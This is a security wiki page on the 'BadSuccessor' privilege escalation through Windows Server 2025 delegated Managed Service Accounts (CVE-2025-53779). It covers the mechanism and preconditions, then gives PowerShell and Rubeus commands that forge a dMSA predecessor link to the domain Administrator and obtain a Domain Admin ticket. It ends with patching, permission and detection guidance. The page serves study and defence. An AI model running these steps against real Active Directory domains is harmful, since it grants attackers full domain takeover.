---
title: dMSA BadSuccessor
slug: dmsa-badsuccessor
---

> **TL;DR:** Windows Server 2025's delegated Managed Service Accounts (dMSA) let a principal with `Create Child` on any OU and `Write` on the new dMSA forge a "successor" link to an arbitrary target — including Domain Admins. The KDC then issues tickets that carry the target's group SIDs in the PAC. Tracked as CVE-2025-53779.

## What it is
dMSA is a 2025 evolution of gMSA designed to migrate a legacy service account: you create a dMSA, link it to the predecessor via `msDS-ManagedAccountPrecededByLink`, mark migration complete on the predecessor (`msDS-DelegatedMSAState = 2`), and the KDC treats authentications to the legacy account as authentications to the dMSA — bundling the predecessor's group memberships into the dMSA's PAC. Akamai's "BadSuccessor" research showed the migration check trusts only the dMSA-side attributes, so an attacker who can write `msDS-ManagedAccountPrecededByLink` can name *any* DN as predecessor.

## Preconditions / where it applies
- Domain functional level Windows Server 2025 with at least one 2025 DC
- `Create msDS-DelegatedManagedServiceAccount` rights on any OU (default Authenticated Users on a fresh container in some configs) — or just `GenericWrite` on an existing dMSA
- Network reach to a 2025 DC for the AS-REQ

## Technique
1. Find a writable OU (Domain Users can create child objects in some default deployments). Create a dMSA:

```powershell
New-ADServiceAccount -Name evil_dmsa -Type DelegatedMSA \
  -DNSHostName evil.corp.local -Path "OU=Workstations,DC=corp,DC=local"
```

2. Point the successor link at a Domain Admin's DN and forge the migration state:

```powershell
Set-ADServiceAccount evil_dmsa -Replace @{
  'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=corp,DC=local';
  'msDS-DelegatedMSAState' = 2
}
```

3. Request a TGT for the dMSA. Rubeus and the Akamai PoC do this via a dedicated AS-REQ that the 2025 KDC services by reading the predecessor's PAC:

```bash
Rubeus.exe asktgs /service:krbtgt/corp.local /dmsa /user:evil_dmsa$ /opsec /nowrap
```

The returned TGT's PAC contains the Domain Administrator's SID, group memberships, and crucially the predecessor's session keys — enabling DCSync, PsExec, or any other DA action.

## Detection and defence
- Apply August 2025 patches (KB-series fix); post-patch, predecessor must explicitly authorise migration via attribute on the predecessor object
- Remove `Create Child: msDS-DelegatedManagedServiceAccount` from non-Tier-0 principals on every OU
- Hunt LDAP modifications of `msDS-ManagedAccountPrecededByLink` and creation of dMSA objects outside the planned migration window
- Watch 4768/4769 where the requested account class is dMSA and the issued PAC contains Tier-0 SIDs

## References
- [Akamai — BadSuccessor research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) — original disclosure + PoC
- [MSRC — CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779) — patch advisory
- [Microsoft Learn — Delegated Managed Service Accounts](https://learn.microsoft.com/windows-server/identity/ad-ds/manage/understand-dmsa) — feature documentation
- See also: [[ad-persistence]], [[dcsync]], [[golden-tickets]]
